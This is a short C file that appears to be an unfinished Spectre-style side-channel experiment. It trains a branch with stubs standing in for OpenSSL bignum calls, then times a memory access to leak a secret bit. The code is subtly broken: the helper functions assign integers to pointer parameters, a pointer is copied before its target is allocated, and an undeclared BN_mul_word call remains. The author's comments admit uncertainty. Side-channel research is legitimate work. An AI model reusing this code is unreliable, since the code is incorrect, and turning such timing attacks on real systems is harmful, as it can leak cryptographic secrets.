#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "config.h"
#include "spectre.h"
#include "timing.h"
// #include <x86intrin.h>

// #include <openssl/bn.h>

// #define clflush(a) asm volatile ("clflush 0(%0)": : "r" (&a):);
// #define access(a) asm volatile ("mov (%0), %%eax" :: "r"((void*)a));
// #define memory_fence(); asm volatile ("mfence;\nsfence;\nlfence;\n");
long* a __attribute__((aligned(4096)));
long* b __attribute__((aligned(4096)));
long secret __attribute__((aligned(4096))) = 0;
long* ptr __attribute__((aligned(4096)));

void mult(long * val, unsigned int w)
{
  val = *val * w;
  return;

}

void setVal(long * val, unsigned int w)
{
  val = w;
}
int main(int argc, char *argv[])
{
  if ((atoi(argv[1])%2) == 0)
    secret = 0;
  else
    secret = 1;
  ptr = b;
  memory_fence();

  unsigned int dummy;
  a = malloc(32);
  b = malloc(32);

  // BN_set_word(a, 1);
  setVal(a, 1); //idr if this is right
  // BN_set_word(b, 0);
  setVal(b, 0);
  memory_fence();

  // Train branch1 true, branch2 false 
  // BN_mul_word(a, 1);
  mult(a, 1);
  // BN_set_word(a, 1);
  setVal(a, 1);
  // BN_mul_word(a, 1);
  mult(a, 1);

  memory_fence();
  
  // clflush(setVal);
  // clflush(b);
  // clflush(ptr);
  *(volatile long*)&secret;
  memory_fence();

  //Branch1 should be false
  BN_mul_word(b, secret);
  memory_fence();

  // uint64_t time = __rdtscp(&dummy);
  timer_start();
  // *(volatile uint64_t*)&BN_set_word;
  *(volatile uint64_t*)&setVal;
  // time = __rdtscp(&dummy) - time;
  timer_end();
  memory_fence();
  // printf("Time: %ld\n", time) ;

  free(a);
  // //avoid mem leak?
  // free(b);
}
